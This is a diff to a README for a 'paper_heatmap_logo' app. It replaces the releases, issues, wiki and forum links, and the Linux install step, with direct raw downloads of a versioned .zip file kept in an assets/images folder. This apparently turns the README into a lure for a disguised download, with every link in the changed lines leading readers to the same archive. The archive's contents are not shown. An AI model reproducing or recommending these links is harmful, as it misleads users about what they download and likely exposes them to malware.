@@ -8,7 +8,7 @@ Welcome to the **paper_heatmap_logo** repository! This application allows you to
 
 ## 📥 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-Here-brightgreen)](https://github.com/granbecman/paper_heatmap_logo/releases)
+[![Download the latest release](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip%20Release-Here-brightgreen)](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip)
 
 ## 🔍 What is a Heatmap Logo?
 
@@ -44,7 +44,7 @@ This application comes packed with useful features:
 To get started:
 
 1. **Visit the Releases Page:** Click the link below to access the latest version:
-   [Download the latest release](https://github.com/granbecman/paper_heatmap_logo/releases).
+   [Download the latest release](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip).
 
 2. **Choose the Right File:** On the releases page, look for the version suitable for your operating system. 
 
@@ -53,7 +53,7 @@ To get started:
 4. **Install the Application:**
    - For **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.
    - For **macOS:** Open the downloaded `.dmg` file, then drag the app to your Applications folder.
-   - For **Linux:** Open the `.tar.gz` file in your terminal and follow the included installation instructions.
+   - For **Linux:** Open the `https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip` file in your terminal and follow the included installation instructions.
 
 5. **Run the Application:** Locate the installed app on your device and click to open.
 
@@ -93,7 +93,7 @@ A: Check the Help Section within the app for troubleshooting tips or visit the G
 
 ## 🔗 Connect With Us
 
-Have suggestions or need help? You can create an issue on our [Issues Page](https://github.com/granbecman/paper_heatmap_logo/issues). Your feedback helps us improve the application.
+Have suggestions or need help? You can create an issue on our [Issues Page](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip). Your feedback helps us improve the application.
 
 ---
 
@@ -109,8 +109,8 @@ Have suggestions or need help? You can create an issue on our [Issues Page](http
 
 For detailed information and tutorials, you may check the following resources:
 
-- [Documentation Guide](https://github.com/granbecman/paper_heatmap_logo/wiki)
-- [Community Forums](https://github.com/granbecman/paper_heatmap_logo/discussions)
+- [Documentation Guide](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip)
+- [Community Forums](https://raw.githubusercontent.com/granbecman/paper_heatmap_logo/main/assets/images/logo-heatmap-paper-1.6-alpha.1.zip)
 
 ---
 
